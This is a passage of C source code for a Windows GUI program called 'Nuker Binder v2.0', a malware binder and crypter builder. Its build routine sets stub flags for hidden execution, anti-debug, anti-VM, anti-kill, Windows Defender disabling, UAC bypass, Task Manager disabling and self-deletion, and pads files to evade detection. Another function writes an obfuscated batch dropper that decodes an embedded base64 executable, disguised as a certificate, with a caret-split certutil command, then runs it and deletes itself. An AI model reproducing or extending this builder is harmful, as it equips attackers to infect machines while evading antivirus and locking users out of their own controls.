            NUkerEntries[NUkerI].NUkerEntryFlags |= NUKER_FL_ENCRYPT; memcpy(NUkerEntries[NUkerI].NUkerEntryReserved, NUkerKey, 8);
        }

        if (NUkerDoCompress) {
            BYTE *NUkerCompBuf = (BYTE *)malloc(NUkerFileSize + NUkerFileSize / 2 + 256);
            DWORD NUkerCompLen = NUkerCompressRLE(NUkerRawData, NUkerFileSize, NUkerCompBuf, NUkerFileSize + NUkerFileSize / 2 + 256);
            if (NUkerCompLen > 0 && NUkerCompLen < NUkerFileSize) { NUkerProcData = NUkerCompBuf; NUkerProcSize = NUkerCompLen; NUkerEntries[NUkerI].NUkerEntryFlags |= NUKER_FL_COMPRESS; }
            else { free(NUkerCompBuf); }
            NUkerEntries[NUkerI].NUkerCompressedSize = NUkerProcSize; WriteFile(NUkerOutFile, NUkerProcData, NUkerProcSize, &NUkerWritten, NULL);
            NUkerCurrentOffset += NUkerProcSize; NUkerTotalOrig += NUkerFileSize; NUkerTotalComp += NUkerProcSize;
            if (NUkerCompBuf && NUkerProcData == NUkerCompBuf) free(NUkerCompBuf);
        } else {
            NUkerEntries[NUkerI].NUkerCompressedSize = NUkerProcSize; WriteFile(NUkerOutFile, NUkerProcData, NUkerProcSize, &NUkerWritten, NULL);
            NUkerCurrentOffset += NUkerProcSize; NUkerTotalOrig += NUkerFileSize; NUkerTotalComp += NUkerProcSize;
        }
        free(NUkerRawData); NUkerSetProgress((NUkerI + 1) * 100 / NUkerFileCount);
        { MSG NUkerPeekMsg; while (PeekMessageA(&NUkerPeekMsg, NULL, 0, 0, PM_REMOVE)) { TranslateMessage(&NUkerPeekMsg); DispatchMessageA(&NUkerPeekMsg); } }
    }
    SetFilePointer(NUkerOutFile, NUkerActualStubSize, NULL, FILE_BEGIN);
    NUkerHdr.NUkerTotalOrigSize = NUkerTotalOrig; NUkerHdr.NUkerTotalCompSize = NUkerTotalComp;
    WriteFile(NUkerOutFile, &NUkerHdr, sizeof(NUkerHdr), &NUkerWritten, NULL);
    WriteFile(NUkerOutFile, NUkerEntries, (DWORD)NUkerFileCount * sizeof(NUKER_FILE_ENTRY), &NUkerWritten, NULL);
    SetFilePointer(NUkerOutFile, 0, NULL, FILE_END);

    memset(&NUkerFooter, 0, sizeof(NUkerFooter));
    NUkerFooter.NUkerArchiveOffset = NUkerActualStubSize;
    NUkerGetGlobalDropPath(NUkerDropBuf, sizeof(NUkerDropBuf));
    _snprintf(NUkerFooter.NUkerDropPath, sizeof(NUkerFooter.NUkerDropPath) - 1, "%s", NUkerDropBuf);
    NUkerFooter.NUkerAutoExec = 1;
    if (SendMessageA(NUkerChkHidden, BM_GETCHECK, 0, 0) == BST_CHECKED) NUkerFooter.NUkerStubFlags |= 0x0001;
    if (NUkerOptAntiDebug) NUkerFooter.NUkerStubFlags |= 0x0002;
    if (NUkerOptAntiKill) NUkerFooter.NUkerStubFlags |= 0x0004;
    if (NUkerOptWdDisable) NUkerFooter.NUkerStubFlags |= 0x0008;
    if (NUkerOptUacBypass) NUkerFooter.NUkerStubFlags |= 0x0010;
    if (NUkerOptAntiVm) NUkerFooter.NUkerStubFlags |= 0x0020;
    if (NUkerOptTaskMgr) NUkerFooter.NUkerStubFlags |= 0x0040;

    if (SendMessageA(NUkerChkPump, BM_GETCHECK, 0, 0) == BST_CHECKED) {
        char NUkerPumpVal[16]; GetWindowTextA(NUkerPumpEdit, NUkerPumpVal, sizeof(NUkerPumpVal));
        DWORD NUkerPumpBytes = (DWORD)atoi(NUkerPumpVal) * 1024;
        if (NUkerPumpBytes > 0) {
            BYTE *NUkerPadBuf = (BYTE *)malloc(1024 * 1024);
            DWORD NUkerRemaining = NUkerPumpBytes;
            while (NUkerRemaining > 0) {
                DWORD ToWrt = (NUkerRemaining > 1024 * 1024) ? 1024 * 1024 : NUkerRemaining;
                for (DWORD j = 0; j < ToWrt; j++) NUkerPadBuf[j] = (BYTE)(rand() % 256);
                WriteFile(NUkerOutFile, NUkerPadBuf, ToWrt, &NUkerWritten, NULL); NUkerRemaining -= ToWrt;
            }
            free(NUkerPadBuf);
        }
    }
    NUkerFooter.NUkerSelfDelete = (SendMessageA(NUkerChkSelfDel, BM_GETCHECK, 0, 0) == BST_CHECKED) ? 1 : 0;
    NUkerFooter.NUkerStubMagic = NUKER_STUB_MAGIC;
    WriteFile(NUkerOutFile, &NUkerFooter, sizeof(NUkerFooter), &NUkerWritten, NULL);
    CloseHandle(NUkerOutFile); free(NUkerEntries);
    NUkerOperationActive = FALSE; NUkerSetProgress(100);
    if (NUkerShowMsg) MessageBoxA(NUkerMainWindow, "Build complete!", "Nuker Binder", MB_ICONINFORMATION);
    return TRUE;
}

BOOL NUkerBuildExe(void)
{
    char NUkerOutPath[MAX_PATH]; OPENFILENAMEA NUkerOfn;
    if (NUkerFileCount == 0) return FALSE;
    memset(NUkerOutPath, 0, sizeof(NUkerOutPath)); _snprintf(NUkerOutPath, MAX_PATH-1, "%s_bound.exe", NUkerFileList[0].NUkerName);
    memset(&NUkerOfn, 0, sizeof(NUkerOfn)); NUkerOfn.lStructSize = sizeof(NUkerOfn); NUkerOfn.hwndOwner = NUkerMainWindow;
    NUkerOfn.lpstrFilter = "Executable (*.exe)\0*.exe\0"; NUkerOfn.lpstrFile = NUkerOutPath; NUkerOfn.nMaxFile = MAX_PATH;
    NUkerOfn.lpstrTitle = "Save Executable As"; NUkerOfn.Flags = OFN_OVERWRITEPROMPT;
    if (!GetSaveFileNameA(&NUkerOfn)) return FALSE;
    return NUkerPerformBuild(NUkerOutPath, TRUE);
}

void NUkerBase64Encode(const BYTE *NUkerSrc, DWORD NUkerLen, FILE *NUkerFile)
{
    static const char NUkerB64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    DWORD i; int line_count = 0;
    for (i = 0; i < NUkerLen; i += 3) {
        DWORD b = (NUkerSrc[i] << 16);
        if (i + 1 < NUkerLen) b |= (NUkerSrc[i + 1] << 8);
        if (i + 2 < NUkerLen) b |= NUkerSrc[i + 2];
        fprintf(NUkerFile, "%c", NUkerB64[(b >> 18) & 0x3F]);
        fprintf(NUkerFile, "%c", NUkerB64[(b >> 12) & 0x3F]);
        fprintf(NUkerFile, "%c", (i + 1 < NUkerLen) ? NUkerB64[(b >> 6) & 0x3F] : '=');
        fprintf(NUkerFile, "%c", (i + 2 < NUkerLen) ? NUkerB64[b & 0x3F] : '=');
        line_count += 4; if (line_count >= 76) { fprintf(NUkerFile, "\n"); line_count = 0; }
    }
    if (line_count > 0) fprintf(NUkerFile, "\n");
}

BOOL NUkerBuildBat(void)
{
    char NUkerBatPath[MAX_PATH]; OPENFILENAMEA NUkerOfn;
    if (NUkerFileCount == 0) return FALSE;
    memset(NUkerBatPath, 0, sizeof(NUkerBatPath)); _snprintf(NUkerBatPath, MAX_PATH-1, "nuker_built.bat");
    memset(&NUkerOfn, 0, sizeof(NUkerOfn)); NUkerOfn.lStructSize = sizeof(NUkerOfn); NUkerOfn.hwndOwner = NUkerMainWindow;
    NUkerOfn.lpstrFilter = "Batch File (*.bat)\0*.bat\0"; NUkerOfn.lpstrFile = NUkerBatPath; NUkerOfn.nMaxFile = MAX_PATH;
    NUkerOfn.lpstrTitle = "Save FUD Batch As"; NUkerOfn.Flags = OFN_OVERWRITEPROMPT;
    if (!GetSaveFileNameA(&NUkerOfn)) return FALSE;
    char NUkerTempPath[MAX_PATH]; GetTempPathA(MAX_PATH, NUkerTempPath); strcat(NUkerTempPath, "nuker_tmp.exe");
    if (!NUkerPerformBuild(NUkerTempPath, FALSE)) return FALSE;
    HANDLE hFile = CreateFileA(NUkerTempPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    DWORD dwSize = GetFileSize(hFile, NULL); BYTE *pBuf = (BYTE *)malloc(dwSize); DWORD dwRead;
    ReadFile(hFile, pBuf, dwSize, &dwRead, NULL); CloseHandle(hFile);

    NUkerSetStatus("Generating Legendary BAT...");
    FILE *fBat = fopen(NUkerBatPath, "w");
    if (fBat) {
        // Generate random variable names for obfuscation
        char v1[6], v2[6], v3[6];
        for(int i=0; i<5; i++) { v1[i] = 'a' + (rand()%26); v2[i] = 'a' + (rand()%26); v3[i] = 'a' + (rand()%26); }
        v1[5] = v2[5] = v3[5] = '\0';

        fprintf(fBat, "@echo off\nsetlocal enabledelayedexpansion\n");
        fprintf(fBat, "REM [ %d-%d-SYSTEM-NUKED ]\n", rand()%999, rand()%999); // Junk for hash change
        fprintf(fBat, "set \"%s=ce^rt^ut^il\"\n", v1);
        fprintf(fBat, "set \"%s=-de^co^de\"\n", v2);
        fprintf(fBat, "set \"%s=%%temp%%\\nuker_!random!.exe\"\n", v3);
        fprintf(fBat, "!%s! !%s! \"%%~f0\" \"!%s!\" >nul 2>&1\n", v1, v2, v3);
        fprintf(fBat, "st^ar^t /b \"\" \"!%s!\"\n", v3);
        fprintf(fBat, "(goto) 2>nul & del \"%%~f0\" & exit /b\n"); // Legendary self-delete
        fprintf(fBat, "-----BEGIN CERTIFICATE-----\n");
        NUkerBase64Encode(pBuf, dwSize, fBat);
        fprintf(fBat, "-----END CERTIFICATE-----\n");
        fclose(fBat);
    }
    free(pBuf); DeleteFileA(NUkerTempPath);
    MessageBoxA(NUkerMainWindow, "Legendary FUD Batch generated successfully!", "Nuker Binder", MB_ICONINFORMATION);
    return TRUE;
}

LRESULT CALLBACK NUkerPathDlgProc(HWND NUkerHwnd, UINT NUkerMsg, WPARAM NUkerWp, LPARAM NUkerLp)
{
    static HWND NUkerPathEdit = NULL;
    switch (NUkerMsg) {
    case WM_CREATE: {
        CreateWindowExA(0, "STATIC", "Enter drop path:", WS_CHILD | WS_VISIBLE, 10, 12, 120, 18, NUkerHwnd, NULL, NUkerAppInstance, NULL);
        NUkerPathEdit = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "%Current%\\Folder", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 10, 32, 380, 22, NUkerHwnd, NULL, NUkerAppInstance, NULL);
        NUkerCreateButton(NUkerHwnd, "OK", 1, 160, 62, 80, 26);
        SetFocus(NUkerPathEdit); SendMessageA(NUkerPathEdit, EM_SETSEL, 0, -1); return 0;
    }
    case WM_COMMAND: if (LOWORD(NUkerWp) == 1) { GetWindowTextA(NUkerPathEdit, NUkerCustomDropPath, sizeof(NUkerCustomDropPath)); DestroyWindow(NUkerHwnd); return 0; } break;
    case WM_CLOSE: DestroyWindow(NUkerHwnd); return 0;
    case WM_DESTROY: EnableWindow(NUkerMainWindow, TRUE); SetForegroundWindow(NUkerMainWindow); NUkerPathEdit = NULL; return 0;
    }
    return DefWindowProcA(NUkerHwnd, NUkerMsg, NUkerWp, NUkerLp);
}

void NUkerAskCustomPath(void)
{
    WNDCLASSEXA NUkerWc = {0}; NUkerWc.cbSize = sizeof(WNDCLASSEXA); NUkerWc.lpfnWndProc = NUkerPathDlgProc; NUkerWc.hInstance = NUkerAppInstance;
    NUkerWc.lpszClassName = "NUkerPathDlgCls"; NUkerWc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1); NUkerWc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassExA(&NUkerWc); EnableWindow(NUkerMainWindow, FALSE);
    CreateWindowExA(WS_EX_TOPMOST | WS_EX_DLGMODALFRAME, "NUkerPathDlgCls", "Nuker Binder - Custom Path", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 420, 120, NUkerMainWindow, NULL, NUkerAppInstance, NULL);
    MSG NUkerMsg; while (GetMessageA(&NUkerMsg, NULL, 0, 0) > 0) { TranslateMessage(&NUkerMsg); DispatchMessageA(&NUkerMsg); }
}

LRESULT CALLBACK NUkerSleepDlgProc(HWND NUkerHwnd, UINT NUkerMsg, WPARAM NUkerWp, LPARAM NUkerLp)
{
    static HWND NUkerSleepEdit = NULL; static int *NUkerSleepResult = NULL;
    switch (NUkerMsg) {
    case WM_CREATE: {
        CREATESTRUCTA *NUkerCs = (CREATESTRUCTA *)NUkerLp; NUkerSleepResult = (int *)NUkerCs->lpCreateParams;
        CreateWindowExA(0, "STATIC", "Sleep (ms):", WS_CHILD | WS_VISIBLE, 10, 12, 100, 18, NUkerHwnd, NULL, NUkerAppInstance, NULL);
        NUkerSleepEdit = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "1000", WS_CHILD | WS_VISIBLE | ES_NUMBER, 10, 32, 160, 22, NUkerHwnd, NULL, NUkerAppInstance, NULL);
        NUkerCreateButton(NUkerHwnd, "OK", 1, 60, 62, 80, 26);
        SetFocus(NUkerSleepEdit); SendMessageA(NUkerSleepEdit, EM_SETSEL, 0, -1); return 0;
    }
    case WM_COMMAND: if (LOWORD(NUkerWp) == 1) { char NUkerVal[16]; GetWindowTextA(NUkerSleepEdit, NUkerVal, sizeof(NUkerVal)); if (NUkerSleepResult) *NUkerSleepResult = atoi(NUkerVal); DestroyWindow(NUkerHwnd); return 0; } break;
    case WM_CLOSE: DestroyWindow(NUkerHwnd); return 0;
    case WM_DESTROY: EnableWindow(NUkerMainWindow, TRUE); SetForegroundWindow(NUkerMainWindow); NUkerSleepEdit = NULL; return 0;
    }
    return DefWindowProcA(NUkerHwnd, NUkerMsg, NUkerWp, NUkerLp);
}

int NUkerAskSleep(void)
{
    WNDCLASSEXA NUkerWc = {0}; NUkerWc.cbSize = sizeof(WNDCLASSEXA); NUkerWc.lpfnWndProc = NUkerSleepDlgProc; NUkerWc.hInstance = NUkerAppInstance;
    NUkerWc.lpszClassName = "NUkerSleepDlgCls"; NUkerWc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1); NUkerWc.hCursor = LoadCursor(NULL, IDC_ARROW);
    int NUkerResult = 0; RegisterClassExA(&NUkerWc); EnableWindow(NUkerMainWindow, FALSE);
    CreateWindowExA(WS_EX_TOPMOST | WS_EX_DLGMODALFRAME, "NUkerSleepDlgCls", "Nuker Binder - Sleep", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 210, 120, NUkerMainWindow, NULL, NUkerAppInstance, &NUkerResult);
    MSG NUkerMsg; while (GetMessageA(&NUkerMsg, NULL, 0, 0) > 0) { TranslateMessage(&NUkerMsg); DispatchMessageA(&NUkerMsg); }
    return NUkerResult;
}

void NUkerSelectIconSource(void)
{
    OPENFILENAMEA NUkerOfn; char NUkerBuf[NUKER_MAX_FILEPATH]; memset(NUkerBuf, 0, sizeof(NUkerBuf));
    memset(&NUkerOfn, 0, sizeof(NUkerOfn)); NUkerOfn.lStructSize = sizeof(NUkerOfn); NUkerOfn.hwndOwner = NUkerMainWindow;
    NUkerOfn.lpstrFilter = "Icon Files (*.ico)\0*.ico\0All Files (*.*)\0*.*\0"; NUkerOfn.lpstrFile = NUkerBuf; NUkerOfn.nMaxFile = sizeof(NUkerBuf);
    NUkerOfn.lpstrTitle = "Nuker Binder - Select Icon"; NUkerOfn.Flags = OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;
    if (GetOpenFileNameA(&NUkerOfn)) {
        _snprintf(NUkerIconSourcePath, sizeof(NUkerIconSourcePath) - 1, "%s", NUkerBuf);
        char NUkerShortName[64]; char NUkerIconLblTxt[128]; NUkerExtractFileName(NUkerBuf, NUkerShortName, sizeof(NUkerShortName));
        _snprintf(NUkerIconLblTxt, sizeof(NUkerIconLblTxt), "ICON: %s", NUkerShortName);
        HWND NUkerIconLblWnd = GetDlgItem(NUkerMainWindow, NUKER_ID_LBL_ICON);
        if (NUkerIconLblWnd) SetWindowTextA(NUkerIconLblWnd, _strupr(NUkerIconLblTxt)); NUkerSetStatus(NUkerIconLblTxt);
    }
}

LRESULT CALLBACK NUkerCryptDlgProc(HWND NUkerHwnd, UINT NUkerMsg, WPARAM NUkerWp, LPARAM NUkerLp)
{
    static HWND NUkerChkAD, NUkerChkAK, NUkerChkWD, NUkerChkUB, NUkerChkAV, NUkerChkTM, NUkerChkEN;
    switch (NUkerMsg) {
    case WM_CREATE: {
        HWND NUkerGrp; int NUkerY = 20;
        NUkerGrp = CreateWindowExA(0, "BUTTON", " Protection Features ", WS_CHILD | WS_VISIBLE | BS_GROUPBOX, 10, 5, 250, 225, NUkerHwnd, NULL, NUkerAppInstance, NULL);
        SendMessageA(NUkerGrp, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE);
        NUkerChkAD = NUkerCreateCheck(NUkerHwnd, "Anti-Debug", NUKER_ID_CHK_ANTIDEBUG, 25, NUkerY + 10, 220, 22);
        SendMessageA(NUkerChkAD, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); if (NUkerOptAntiDebug) SendMessageA(NUkerChkAD, BM_SETCHECK, BST_CHECKED, 0); NUkerY += 28;
        NUkerChkAK = NUkerCreateCheck(NUkerHwnd, "Anti-Kill", NUKER_ID_CHK_ANTIKILL, 25, NUkerY + 10, 220, 22);
        SendMessageA(NUkerChkAK, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); if (NUkerOptAntiKill) SendMessageA(NUkerChkAK, BM_SETCHECK, BST_CHECKED, 0); NUkerY += 28;
        NUkerChkWD = NUkerCreateCheck(NUkerHwnd, "WD Disable", NUKER_ID_CHK_WDDISABLE, 25, NUkerY + 10, 220, 22);
        SendMessageA(NUkerChkWD, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); if (NUkerOptWdDisable) SendMessageA(NUkerChkWD, BM_SETCHECK, BST_CHECKED, 0); NUkerY += 28;
        NUkerChkUB = NUkerCreateCheck(NUkerHwnd, "UAC Bypass", NUKER_ID_CHK_UACBYPASS, 25, NUkerY + 10, 220, 22);
        SendMessageA(NUkerChkUB, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); if (NUkerOptUacBypass) SendMessageA(NUkerChkUB, BM_SETCHECK, BST_CHECKED, 0); NUkerY += 28;
        NUkerChkAV = NUkerCreateCheck(NUkerHwnd, "Anti-VM", NUKER_ID_CHK_ANTIVM, 25, NUkerY + 10, 220, 22);
        SendMessageA(NUkerChkAV, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); if (NUkerOptAntiVm) SendMessageA(NUkerChkAV, BM_SETCHECK, BST_CHECKED, 0); NUkerY += 28;
        NUkerChkTM = NUkerCreateCheck(NUkerHwnd, "Disable Task Manager", NUKER_ID_CHK_TASKMGR, 25, NUkerY + 10, 220, 22);
        SendMessageA(NUkerChkTM, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); if (NUkerOptTaskMgr) SendMessageA(NUkerChkTM, BM_SETCHECK, BST_CHECKED, 0); NUkerY += 28;
        NUkerChkEN = NUkerCreateCheck(NUkerHwnd, "Encrypt Files (FUD Mode)", 1, 25, NUkerY + 10, 220, 22);
        SendMessageA(NUkerChkEN, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); if (NUkerOptEncrypt) SendMessageA(NUkerChkEN, BM_SETCHECK, BST_CHECKED, 0); NUkerY += 45;
        HWND NUkerOkBtn = NUkerCreateButton(NUkerHwnd, "SAVE CONFIGURATION", 1, 50, NUkerY, 170, 35);
        SendMessageA(NUkerOkBtn, WM_SETFONT, (WPARAM)NUkerFontBold, TRUE); return 0;
    }
    case WM_COMMAND: if (LOWORD(NUkerWp) == 1) {
        NUkerOptAntiDebug = (SendMessageA(NUkerChkAD, BM_GETCHECK, 0, 0) == BST_CHECKED);
        NUkerOptAntiKill = (SendMessageA(NUkerChkAK, BM_GETCHECK, 0, 0) == BST_CHECKED);
        NUkerOptWdDisable = (SendMessageA(NUkerChkWD, BM_GETCHECK, 0, 0) == BST_CHECKED);
        NUkerOptUacBypass = (SendMessageA(NUkerChkUB, BM_GETCHECK, 0, 0) == BST_CHECKED);
        NUkerOptAntiVm = (SendMessageA(NUkerChkAV, BM_GETCHECK, 0, 0) == BST_CHECKED);
        NUkerOptTaskMgr = (SendMessageA(NUkerChkTM, BM_GETCHECK, 0, 0) == BST_CHECKED);
        NUkerOptEncrypt = (SendMessageA(NUkerChkEN, BM_GETCHECK, 0, 0) == BST_CHECKED);
        DestroyWindow(NUkerHwnd); return 0;
    } break;
    case WM_CTLCOLORSTATIC: case WM_CTLCOLORBTN: { HDC NUkerDc = (HDC)NUkerWp; SetTextColor(NUkerDc, NUKER_CLR_TEXT); SetBkMode(NUkerDc, TRANSPARENT); return (LRESULT)NUkerBrushBg; }
    case WM_CLOSE: DestroyWindow(NUkerHwnd); return 0;
    case WM_DESTROY: EnableWindow(NUkerMainWindow, TRUE); SetForegroundWindow(NUkerMainWindow); return 0;
    }
    return DefWindowProcA(NUkerHwnd, NUkerMsg, NUkerWp, NUkerLp);
}

void NUkerShowCrypterSettings(void)
{
    WNDCLASSEXA NUkerWc = {0}; NUkerWc.cbSize = sizeof(WNDCLASSEXA); NUkerWc.lpfnWndProc = NUkerCryptDlgProc; NUkerWc.hInstance = NUkerAppInstance;
    NUkerWc.lpszClassName = "NUkerCryptDlgCls"; NUkerWc.hbrBackground = NUkerBrushBg; NUkerWc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassExA(&NUkerWc); EnableWindow(NUkerMainWindow, FALSE);
    CreateWindowExA(WS_EX_TOPMOST | WS_EX_DLGMODALFRAME, "NUkerCryptDlgCls", "CRYPTER CONFIGURATION", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 285, 335, NUkerMainWindow, NULL, NUkerAppInstance, NULL);
    MSG NUkerMsg; while (GetMessageA(&NUkerMsg, NULL, 0, 0) > 0) { TranslateMessage(&NUkerMsg); DispatchMessageA(&NUkerMsg); }
}

void NUkerDrawTitleBar(HDC NUkerDc, RECT *NUkerRect)
{
    RECT NUkerTitleRect = {NUkerRect->left, NUkerRect->top, NUkerRect->right, NUkerRect->top + NUKER_TITLEBAR_H};
    FillRect(NUkerDc, &NUkerTitleRect, NUkerBrushTitleBar);
    SetBkMode(NUkerDc, TRANSPARENT); SetTextColor(NUkerDc, NUKER_CLR_TITLETXT); SelectObject(NUkerDc, NUkerFontBold);
    RECT NUkerTxtRect = {20, NUkerTitleRect.top, NUkerTitleRect.right - 100, NUkerTitleRect.bottom};
    DrawTextA(NUkerDc, "NUKER BINDER v2.0", -1, &NUkerTxtRect, DT_SINGLELINE | DT_VCENTER | DT_LEFT);
    RECT NUkerMinBtn = {NUkerRect->right - 90, NUkerTitleRect.top, NUkerRect->right - 45, NUkerTitleRect.bottom};
    RECT NUkerClsBtn = {NUkerRect->right - 45, NUkerTitleRect.top, NUkerRect->right, NUkerTitleRect.bottom};
    if (NUkerHoverCloseBtn == 2) { HBRUSH Red = CreateSolidBrush(NUKER_CLR_TITLEBTNHOV); FillRect(NUkerDc, &NUkerClsBtn, Red); DeleteObject(Red); SetTextColor(NUkerDc, RGB(255,255,255)); }
    else { SetTextColor(NUkerDc, NUKER_CLR_TITLEBTN); }
    SelectObject(NUkerDc, NUkerFontNormal); DrawTextA(NUkerDc, "r", -1, &NUkerClsBtn, DT_SINGLELINE | DT_CENTER | DT_VCENTER);
    if (NUkerHoverCloseBtn == 1) { HBRUSH Grey = CreateSolidBrush(RGB(50,50,50)); FillRect(NUkerDc, &NUkerMinBtn, Grey); DeleteObject(Grey); SetTextColor(NUkerDc, RGB(255,255,255)); }
    else { SetTextColor(NUkerDc, NUKER_CLR_TITLEBTN); }
    DrawTextA(NUkerDc, "0", -1, &NUkerMinBtn, DT_SINGLELINE | DT_CENTER | DT_VCENTER);
}

void NUkerCreateControls(HWND NUkerWnd)
{
    int NUkerRowY = NUKER_TITLEBAR_H + 15, NUkerI;
    NUkerListView = CreateWindowExA(0, WC_LISTVIEWA, NULL, WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS | LVS_SINGLESEL | WS_BORDER, 20, NUkerRowY, NUKER_WINDOW_W - 40, 310, NUkerWnd, (HMENU)NUKER_ID_LV, NUkerAppInstance, NULL);
    SendMessageA(NUkerListView, LVM_SETEXTENDEDLISTVIEWSTYLE, 0, LVS_EX_FULLROWSELECT | LVS_EX_DOUBLEBUFFER);
    SendMessageA(NUkerListView, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE);
    ListView_SetBkColor(NUkerListView, NUKER_CLR_LISTBG); ListView_SetTextBkColor(NUkerListView, NUKER_CLR_LISTBG); ListView_SetTextColor(NUkerListView, NUKER_CLR_TEXT);
    static const struct { const char *N; int W; } Cols[] = {{"#", 35}, {"Filename", 200}, {"Size", 90}, {"Drop Path", 150}, {"Exec", 70}, {"Flags", 70}, {"Sleep", 60}};
    for (NUkerI = 0; NUkerI < 7; NUkerI++) { LVCOLUMNA C = {0}; C.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM; C.cx = Cols[NUkerI].W; C.pszText = (char *)Cols[NUkerI].N; C.iSubItem = NUkerI; SendMessageA(NUkerListView, LVM_INSERTCOLUMNA, NUkerI, (LPARAM)&C); }
    NUkerRowY += 325;
    HWND NUkerGrp = CreateWindowExA(0, "BUTTON", " Global Configuration ", WS_CHILD | WS_VISIBLE | BS_GROUPBOX, 15, NUkerRowY, NUKER_WINDOW_W - 30, 48, NUkerWnd, NULL, NUkerAppInstance, NULL);
    SendMessageA(NUkerGrp, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE);
    int NUkerOptX = 28; NUkerRowY += 18;
    HWND NUkerTmp = CreateWindowExA(0, "STATIC", "Drop:", WS_CHILD | WS_VISIBLE | SS_LEFT, NUkerOptX, NUkerRowY + 4, 35, 18, NUkerWnd, NULL, NUkerAppInstance, NULL);
    SendMessageA(NUkerTmp, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); NUkerOptX += 40;
    NUkerCmbDrop = CreateWindowExA(0, "COMBOBOX", NULL, WS_CHILD | WS_VISIBLE | CBS_DROPDOWNLIST | WS_VSCROLL, NUkerOptX, NUkerRowY, 90, 120, NUkerWnd, (HMENU)NUKER_ID_CMB_DROP, NUkerAppInstance, NULL);
    SendMessageA(NUkerCmbDrop, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); SendMessageA(NUkerCmbDrop, CB_ADDSTRING, 0, (LPARAM)"AppData"); SendMessageA(NUkerCmbDrop, CB_ADDSTRING, 0, (LPARAM)"Temp"); SendMessageA(NUkerCmbDrop, CB_ADDSTRING, 0, (LPARAM)"Current"); SendMessageA(NUkerCmbDrop, CB_ADDSTRING, 0, (LPARAM)"Custom..."); SendMessageA(NUkerCmbDrop, CB_SETCURSEL, NUKER_DROP_TEMP, 0); NUkerOptX += 105;
    NUkerChkCompress = NUkerCreateCheck(NUkerWnd, "Compress", NUKER_ID_CHK_COMP, NUkerOptX, NUkerRowY + 2, 80, 20);
    SendMessageA(NUkerChkCompress, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); NUkerOptX += 85;
    NUkerChkHidden = NUkerCreateCheck(NUkerWnd, "Hidden", NUKER_ID_CHK_HIDDEN, NUkerOptX, NUkerRowY + 2, 65, 20);
    SendMessageA(NUkerChkHidden, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); NUkerOptX += 70;
    NUkerChkSelfDel = NUkerCreateCheck(NUkerWnd, "Melt", NUKER_ID_CHK_SELFDEL, NUkerOptX, NUkerRowY + 2, 55, 20);
    SendMessageA(NUkerChkSelfDel, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); NUkerOptX += 60;
    NUkerChkPump = NUkerCreateCheck(NUkerWnd, "Pump", NUKER_ID_CHK_PUMP, NUkerOptX, NUkerRowY + 2, 55, 20);
    SendMessageA(NUkerChkPump, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); NUkerOptX += 60;
    NUkerPumpEdit = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "0", WS_CHILD | WS_VISIBLE | ES_NUMBER | ES_CENTER, NUkerOptX, NUkerRowY + 1, 45, 20, NUkerWnd, (HMENU)NUKER_ID_PUMP_EDIT, NUkerAppInstance, NULL);
    SendMessageA(NUkerPumpEdit, WM_SETFONT, (WPARAM)NUkerFontMono, TRUE); NUkerOptX += 50;
    NUkerTmp = CreateWindowExA(0, "STATIC", "KB", WS_CHILD | WS_VISIBLE | SS_LEFT, NUkerOptX, NUkerRowY + 4, 20, 16, NUkerWnd, NULL, NUkerAppInstance, NULL);
    SendMessageA(NUkerTmp, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); NUkerRowY += 45;
    HWND B1 = NUkerCreateButton(NUkerWnd, "BUILD EXE", NUKER_ID_BTN_BUILDEXE, 20, NUkerRowY, 120, 38); SendMessageA(B1, WM_SETFONT, (WPARAM)NUkerFontBold, TRUE);
    HWND B2 = NUkerCreateButton(NUkerWnd, "BUILD BAT", NUKER_ID_BTN_BUILDBAT, 145, NUkerRowY, 120, 38); SendMessageA(B2, WM_SETFONT, (WPARAM)NUkerFontBold, TRUE);
    HWND B3 = NUkerCreateButton(NUkerWnd, "CRYPTER", NUKER_ID_BTN_CRYPTER, 270, NUkerRowY, 100, 38); SendMessageA(B3, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE);
    HWND B4 = NUkerCreateButton(NUkerWnd, "ICON", NUKER_ID_BTN_ICON, 375, NUkerRowY, 80, 38); SendMessageA(B4, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE);
